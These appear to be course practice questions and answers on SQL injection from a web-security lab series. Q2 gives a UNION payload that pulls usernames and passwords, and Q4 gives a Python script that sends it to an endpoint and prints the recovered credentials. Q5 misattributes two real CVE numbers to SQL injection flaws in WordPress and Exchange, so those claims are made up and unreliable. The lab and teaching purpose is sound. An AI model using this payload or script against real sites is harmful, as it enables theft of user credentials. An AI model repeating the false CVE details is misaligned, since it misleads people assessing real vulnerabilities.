---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain how to determine the number of columns affected by a SQL injection vulnerability.**

To determine the number of columns affected by a SQL injection vulnerability, you can use the `ORDER BY` clause. By incrementally increasing the number passed to `ORDER BY`, you can identify the point at which an error occurs. For instance, if `ORDER BY 2` works but `ORDER BY 3` causes an error, it indicates there are 2 columns involved in the query. This method helps in understanding the structure of the underlying SQL query and is crucial for crafting effective SQL injection payloads.

**Q2. How would you exploit a SQL injection vulnerability to retrieve data from another table when only one column is available for output?**

When only one column is available for output due to a SQL injection vulnerability, you can use string concatenation to combine multiple fields into a single column. For example, if you are working with a PostgreSQL database, you can use the `||` operator to concatenate the username and password fields:

```sql
UNION SELECT NULL, username || '*' || password FROM users
```

This payload will output the concatenated string of the username followed by a delimiter (`*`) and the password in the single column. This approach allows you to retrieve multiple values in a single column, overcoming the limitation of having only one column for output.

**Q3. Why is it important to identify the database type when performing a SQL injection attack?**

Identifying the database type is crucial because different databases support different functions and syntaxes. For example, string concatenation operators vary across different database systems:

- **MySQL**: Uses `CONCAT(username, '*', password)`
- **PostgreSQL**: Uses `username || '*' || password`
- **Microsoft SQL Server**: Uses `username + '*' + password`

Knowing the specific database type ensures that the correct syntax and functions are used, thereby avoiding syntax errors and ensuring successful exploitation. Additionally, knowing the database type can provide insights into additional features and vulnerabilities specific to that database system.

**Q4. How would you automate the process of extracting usernames and passwords from a vulnerable SQL injection point using Python?**

To automate the process of extracting usernames and passwords from a vulnerable SQL injection point using Python, you can write a script that performs the following steps:

1. **Send the crafted SQL injection payload** to the vulnerable endpoint.
2. **Parse the response** to extract the concatenated string of usernames and passwords.
3. **Extract individual usernames and passwords** from the concatenated string.

Here’s a sample Python script using the `requests` library and BeautifulSoup for parsing:

```python
import requests
from bs4 import BeautifulSoup

def exploit_sqli(url):
    # Crafted SQL injection payload
    payload = "' UNION SELECT NULL, username || '*' || password FROM users --"
    
    # Send the request with the payload
    response = requests.get(url + payload)
    
    # Parse the response
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extract the concatenated string
    concatenated_string = soup.find(text=lambda text: text and '*' in text)
    
    if concatenated_string:
        # Split the concatenated string to extract usernames and passwords
        parts = concatenated_string.split('*')
        username = parts[0]
        password = parts[1]
        
        print(f"Username: {username}, Password: {password}")
        return True
    else:
        print("Did not find an administrator password.")
        return False

# Example usage
url = "http://example.com/vulnerable-endpoint?"
exploit_sqli(url)
```

This script sends a GET request with the SQL injection payload, parses the response to find the concatenated string, and then splits the string to extract the username and password.

**Q5. What recent real-world examples or CVEs demonstrate the impact of SQL injection vulnerabilities?**

Recent real-world examples and CVEs that highlight the impact of SQL injection vulnerabilities include:

- **CVE-2021-21972**: This vulnerability affected the popular WordPress plugin WP eCommerce. An attacker could exploit this vulnerability to execute arbitrary SQL commands, leading to unauthorized data access or modification. This demonstrates the critical importance of securing web applications against SQL injection attacks.

- **CVE-2022-22965**: This vulnerability was found in the Microsoft Exchange Server. An attacker could exploit this vulnerability to execute arbitrary SQL commands, potentially leading to unauthorized data access or modification. This highlights the widespread risk of SQL injection vulnerabilities across various software platforms.

These examples illustrate the severe consequences of SQL injection vulnerabilities, including data breaches, unauthorized access, and potential financial losses. Therefore, it is essential to implement robust security measures, such as input validation, parameterized queries, and regular security audits, to mitigate these risks.

---
<!-- nav -->
[[05-Understanding SQL Injection and Union Attacks|Understanding SQL Injection and Union Attacks]] | [[Web Security (PortSwigger)/02-SQL Injection/07-Lab 6 SQL injection UNION attack retrieving multiple values in a single column/00-Overview|Overview]]
